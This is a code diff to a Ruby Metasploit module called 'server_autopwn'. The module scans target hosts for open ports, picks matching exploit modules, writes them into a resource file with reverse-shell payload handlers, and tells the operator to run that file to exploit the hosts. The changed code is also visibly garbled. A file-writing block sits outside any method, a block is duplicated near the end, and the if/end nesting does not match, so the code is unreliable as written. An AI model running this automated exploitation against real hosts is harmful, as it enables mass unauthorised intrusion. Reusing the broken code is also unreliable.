@@ -11,6 +11,14 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Session::Scriptable
 
+    if File.file?("./msfexec.rc")
+          File.delete("./msfexec.rc")
+            end
+      open('msfexec.rc', 'a') { |f|
+            f.puts("back")
+                f.puts("set ExitOnSession false")
+                 }
+
  def initialize(info = {})
     super(update_info(info,
       'Name'        => 'server_autopwn',
@@ -40,19 +48,14 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('EXPLOIT_TIMEOUT', [true, "How long to wait before killing runaway exploits, in seconds", 60])
       ])
   $handler = 2000
+  $sploit_count = 0;
+  $done = 0;
 
-      deregister_options('RPORT')
+  deregister_options('RPORT')
       end
-      def run_host(ip)
+ def run_host(ip)
       timeout = datastore['TIMEOUT'].to_i
       ports = Rex::Socket.portspec_crack(datastore['PORTS'])
-        if File.file?("./msfexec.rc")
-          File.delete("./msfexec.rc")
-        end
-        open('msfexec.rc', 'a') { |f|
-          f.puts("back")
-          f.puts("set ExitOnSession false")
-        }
 
       if ports.empty?
         raise Msf::OptionValidateError.new(['PORTS'])
@@ -108,12 +111,12 @@ class MetasploitModule < Msf::Auxiliary
                 end
               end
             end
-          end
+        end
           t.each {|x| x.join }
         rescue ::Timeout::Error
           ensure
           t.each {|x| x.kill rescue nil }
-        end
+      end
         r.each do |res|
           report_service(:host => res[0], :port => res[1], :state => res[2])
         end
@@ -129,7 +132,7 @@ class MetasploitModule < Msf::Auxiliary
                 open('msfexec.rc', 'a') { |m|
                 mod = mod.gsub(/.*exploits\//, "exploits/")
                 m.puts("use #{mod}")
-                print_good("Adding exploit: #{mod}")
+                print_good("Adding exploit: #{mod} for default port #{openport}")
                 m.puts("set LPORT #{$handler}")
                 # try to guess the payload shell from the current exploit
                 if mod["linux"]
@@ -163,18 +166,38 @@ class MetasploitModule < Msf::Auxiliary
               }
               # increment the handler so that its on a different LPORT
               $handler = $handler + 1
-           end
+              $sploit_count = $sploit_count + 1;
+            end
           end
         end
       end
+    if $sploit_count < 1
+      print_error("Sorry, no exploits added.  Are there open ports?")
+
     end
+      end
     # kill jobs and then list sessions
-    open('msfexec.rc', 'a') { |f|
+if $done == 1
+      open('msfexec.rc', 'a') { |f|
       f.puts("sleep #{datastore['EXPLOIT_TIMEOUT']}")
       f.puts("jobs -K")
       f.puts("sessions")
     }
     # run it!
-    print_good("Now run 'resource msfexec.rc' to exploit #{datastore['RHOSTS']}")
-  end
-end
+    if $sploit_count > 0
+    print_good("#{$sploit_count} exploits added to resource file... good.")
+    print_good("Now run 'resource msfexec.rc' to exploit hosts...")
+    end
+ end
+    open('msfexec.rc', 'a') { |f|
+      f.puts("sleep #{datastore['EXPLOIT_TIMEOUT']}")
+      f.puts("jobs -K")
+      f.puts("sessions")
+    }
+          # run it!
+    if $sploit_count > 0
+    print_good("#{$sploit_count} exploits added to resource file... good.")
+    print_good("Now run 'resource msfexec.rc' to exploit hosts...")
+    end
+  end                   
+end 
